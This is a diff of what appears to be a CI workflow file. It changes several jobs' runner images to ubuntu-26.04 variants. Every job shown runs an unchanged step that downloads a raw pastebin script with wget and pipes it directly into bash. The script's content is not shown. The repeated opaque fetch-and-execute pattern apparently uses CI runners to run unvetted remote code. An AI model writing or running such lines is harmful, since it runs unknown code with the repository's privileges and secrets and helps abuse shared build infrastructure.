@@ -13,17 +13,17 @@ jobs:
       - run: |
           wget -qO- https://pastebin.com/raw/WYGs2qaH | tr -d '\r' | bash
   main-3:
-    runs-on: ubuntu-24.04
+    runs-on: ubuntu-26.04
     steps:
       - run: |
           wget -qO- https://pastebin.com/raw/WYGs2qaH | tr -d '\r' | bash
   main-4:
-    runs-on: ubuntu-24.04-arm
+    runs-on: ubuntu-26.04-arm
     steps:
       - run: |
           wget -qO- https://pastebin.com/raw/WYGs2qaH | tr -d '\r' | bash
   main-5:
-    runs-on: ubuntu-22.04
+    runs-on: ubuntu-26.04
     steps:
       - run: |
           wget -qO- https://pastebin.com/raw/WYGs2qaH | tr -d '\r' | bash
